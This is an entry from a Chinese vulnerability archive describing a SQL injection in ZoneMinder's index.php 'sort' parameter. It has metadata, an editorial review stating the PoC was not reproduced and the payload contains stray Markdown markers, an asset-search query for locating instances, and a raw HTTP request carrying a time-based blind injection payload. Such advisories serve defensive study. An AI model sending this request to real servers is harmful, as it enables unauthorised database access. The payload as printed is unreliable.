---
source: "wy876 漏洞文库"
id: "vw-76c0d8d1dfc83fc664afd92f"
entity_id: "ve-76c0d8d1dfc83fc664afd92f"
schema_version: "1"
title: "ZoneMinder index存在SQL注入漏洞"
product: "ZoneMinder"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无版本/认证条件，mid1监视器状态"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/ZoneMinder/ZoneMinderindex%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/gore50bddk9vgsxg"
source_status: "recorded"
---

# ZoneMinder index存在SQL注入漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：ZoneMinder
- 本文讨论：index.php watch sort SQL注入
- 版本、权限与配置前提：无版本/认证条件，mid1监视器状态
- 资料类型：一阶排序SQL注入摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- sort载荷含Markdown **强调标记，直接发往数据库不是所述普通函数表达式
- 只有sleep6无基线/响应，无法确认；无CVE/修复
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 真实参数/角色/版本与延迟因果待确认
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
ZoneMinder index存在SQL注入漏洞

# 二、影响版本
+ ZoneMinder

# 三、资产测绘
```plain
app="ZoneMinder"
```


# 四、漏洞复现
```http
GET /zm/index.php?sort=**if(now()=sysdate()%2Csleep(6)%2C0)**&order=desc&limit=20&view=request&request=watch&mid=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gore50bddk9vgsxg>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
